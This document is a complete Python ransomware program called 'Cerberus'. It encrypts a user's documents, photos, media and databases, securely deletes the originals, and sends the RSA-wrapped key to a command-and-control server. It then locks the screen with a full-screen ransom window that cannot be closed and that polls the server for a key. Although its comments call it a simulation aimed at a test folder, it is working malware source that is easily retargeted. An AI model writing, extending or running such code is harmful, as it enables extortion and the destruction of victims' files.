# ransomware.py
import os
import base64
import json
import threading
import time
from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
from tkinter import font as tkfont
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import requests

# --- Configuration ---
# PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyX1m6vQkFgHqCwG9xN8
... (Your public key will be here) ...
FQIDAQAB
-----END PUBLIC KEY-----"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
TARGET_DIRECTORY = os.path.join(os.path.expanduser("~"), "test_data")
LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
LOG_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_log.txt")
ENCRYPTED_EXTENSION = ".cerberus"

# --- File Type Targeting ---
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv', '.sql', '.db'
}

# --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
# For more realism, replace this with a base64 string of a real menacing logo
LOGO_BASE64 = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
"""

# --- Cryptography ---
def generate_aes_key():
    return os.urandom(32)

def encrypt_file_aes_gcm(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(file_path + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(nonce + encryptor.tag + encrypted_data)
        return True
    except Exception as e:
        log_error(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file_aes_gcm(encrypted_path, key):
    try:
        with open(encrypted_path, 'rb') as f:
            nonce_tag_data = f.read()
        nonce, tag, encrypted_data = nonce_tag_data[:12], nonce_tag_data[12:28], nonce_tag_data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        original_path = encrypted_path.removesuffix(ENCRYPTED_EXTENSION)
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(encrypted_path)
        return True
    except Exception as e:
        log_error(f"Failed to decrypt {encrypted_path}: {e}")
        return False

def secure_delete_file(file_path, passes=3):
    try:
        with open(file_path, "ba+") as f:
            length = f.tell()
        for _ in range(passes):
            with open(file_path, "r+b") as f:
                f.seek(0)
                f.write(os.urandom(length))
        os.remove(file_path)
    except Exception as e:
        log_error(f"Failed to securely delete {file_path}: {e}")

# --- Logging ---
def log_error(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {message}\n")
    except:
        pass # Can't log, nothing to do

# --- Ransomware Logic ---
def encrypt_directory():
    if not os.path.exists(TARGET_DIRECTORY):
        os.makedirs(TARGET_DIRECTORY)
        log_error(f"Created target directory: {TARGET_DIRECTORY}")

    # Prevent re-encryption
    if os.path.exists(LOCK_FILE):
        log_error("Encryption already performed. Skipping.")
        return

    aes_key = generate_aes_key()
    encrypted_files = 0
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
                if encrypt_file_aes_gcm(file_path, aes_key):
                    secure_delete_file(file_path)
                    encrypted_files += 1

    # Mark as complete
    with open(LOCK_FILE, 'w') as f:
        f.write("Encryption complete.")

    log_error(f"Encryption finished. {encrypted_files} files targeted.")
    return aes_key

def check_in_with_c2(aes_key):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        
        public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY.encode(), backend=default_backend())
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        payload = {"key": base64.b64encode(encrypted_aes_key).decode('utf-8')}
        
        response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=10)
        response.raise_for_status()
        victim_id = response.json()['victim_id']
        log_error(f"Successfully checked in. Victim ID: {victim_id}")
        return victim_id
    except Exception as e:
        log_error(f"C2 check-in failed: {e}")
        return None

# --- GUI Logic ---
class RansomwareGUI:
    def __init__(self, master, victim_id):
        self.master = master
        self.victim_id = victim_id
        self.key_url = None

        # Kiosk Mode Settings
        master.overrideredirect(True)  # Remove title bar
        master.attributes('-fullscreen', True)  # Fullscreen
        master.attributes('-topmost', True)  # Always on top
        master.configure(bg='#0a0a0a')
        master.bind('<FocusOut>', self.refocus) # Prevent losing focus
        master.bind('<Escape>', lambda e: None) # Disable Escape key
        master.protocol("WM_DELETE_WINDOW", self.disable_event) # Disable close button

        # GUI Elements
        try:
            logo_data = base64.b64decode(LOGO_BASE64)
            self.logo = PhotoImage(data=logo_data)
        except:
            self.logo = None # Fallback if no logo

        main_frame = Frame(master, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both', padx=50, pady=50)

        if self.logo:
            Label(main_frame, image=self.logo, bg='#0a0a0a').pack(pady=10)

        title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
        body_font = tkfont.Font(family="Helvetica", size=14)

        Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
        Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=600).pack(pady=5)
        Label(main_frame, text="To get your files back, you must wait for your unique decryption key.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=600).pack(pady=5)

        Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
        self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=16, weight="bold"), fg='#4dff88', bg='#0a0a0a')
        self.victim_id_label.pack()

        self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation...", font=body_font, fg='#ffff4d', bg='#0a0a0a')
        self.status_label.pack(pady=(20, 5))

        Label(main_frame, text="Once your key is ready, it will appear below automatically.", font=body_font, fg='#cccccc', bg='#0a0a0a').pack(pady=5)
        
        self.key_var = StringVar()
        self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=64, bg='#2a2a2a', fg='#ffffff', insertbackground='white')
        self.key_entry.pack(pady=10, ipady=4)
        self.key_entry.config(state='readonly')

        self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', activebackground='#cc0000', activeforeground='white')
        self.decrypt_button.pack(pady=20)

        # Start the heartbeat thread
        self.heartbeat_thread_running = True
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_polling, daemon=True)
        self.heartbeat_thread.start()

    def refocus(self, event=None):
        self.master.focus_force()

    def disable_event(self):
        pass

    def heartbeat_polling(self):
        while self.heartbeat_thread_running:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status") == "ready":
                        self.key_url = data.get("key_url")
                        key_response = requests.get(self.key_url, timeout=5)
                        if key_response.status_code == 200:
                            key = key_response.text.strip()
                            self.master.after(0, self.update_key_field, key)
                            self.heartbeat_thread_running = False
            except Exception as e:
                log_error(f"Heartbeat error: {e}")
            time.sleep(30) # Poll every 30 seconds

    def update_key_field(self, key):
        self.key_var.set(key)
        self.key_entry.config(state='normal')
        self.status_label.config(text="STATUS: Decryption key received. You may now decrypt your files.", fg='#4dff88')
        self.decrypt_button.config(state='normal')
        self.key_entry.config(state='readonly')

    def start_decryption(self):
        key_b64 = self.key_var.get()
        if not key_b64:
            self.status_label.config(text="ERROR: No key provided.", fg='red')
            return
        try:
            key = base64.b64decode(key_b64)
            decrypted_files = 0
            for root, _, files in os.walk(TARGET_DIRECTORY):
                for file in files:
                    if file.endswith(ENCRYPTED_EXTENSION):
                        file_path = os.path.join(root, file)
                        if decrypt_file_aes_gcm(file_path, key):
                            decrypted_files += 1
            
            # Clean up lock file
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
            
            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted. You can now close this window.", fg='#4dff88')
            self.heartbeat_thread_running = False
            self.decrypt_button.config(state='disabled')
            # Allow closing after successful decryption
            self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
            self.master.bind('<Escape>', lambda e: self.master.destroy())

        except Exception as e:
            log_error(f"Decryption failed: {e}")
            self.status_label.config(text="ERROR: Decryption failed. Invalid key?", fg='red')

# --- Main Execution ---
if __name__ == "__main__":
    # Step 1: Encrypt files and get the key
    aes_key = encrypt_directory()
    if not aes_key:
        # If encryption was already done, we need to retrieve the victim ID
        # In a real scenario, this ID might be stored in a file.
        # For this simulation, if the lock file exists, we assume we need to check in again
        # to get the ID, or we can't proceed. Let's try to get the ID.
        log_error("Encryption already done. Checking for victim ID to launch GUI.")
        # This part is tricky. Without a stored ID, we can't poll.
        # For this demo, we will just exit if the lock file exists and we can't get an ID.
        # A more advanced version would store the ID in a hidden file.
        if os.path.exists(LOCK_FILE):
            log_error("Cannot proceed without Victim ID. Exiting.")
            # To make it re-runnable for testing, you could comment out the exit and
            # have it generate a new key and check in again, but that's not realistic.
            # For now, we'll just show an error and exit.
            # Create a simple error window
            root = Tk()
            root.withdraw()
            import tkinter.messagebox as messagebox
            messagebox.showerror("Cerberus", "System already locked. Cannot re-run payload.")
            exit()
        else:
            # This case should not happen, but as a fallback
            log_error("Unknown error. Exiting.")
            exit()

    # Step 2: Check in with the C2 server to get the Victim ID
    victim_id = check_in_with_c2(aes_key)
    if not victim_id:
        log_error("FATAL: Could not connect to C2 server. Cannot continue.")
        # Create a simple error window
        root = Tk()
        root.withdraw()
        import tkinter.messagebox as messagebox
        messagebox.showerror("Cerberus", "Network error. Could not connect to activation server.")
        exit()

    # Step 3: Launch the persistent GUI
    root = Tk()
    app = RansomwareGUI(root, victim_id)
    root.mainloop()

    log_error("GUI closed. Exiting.")
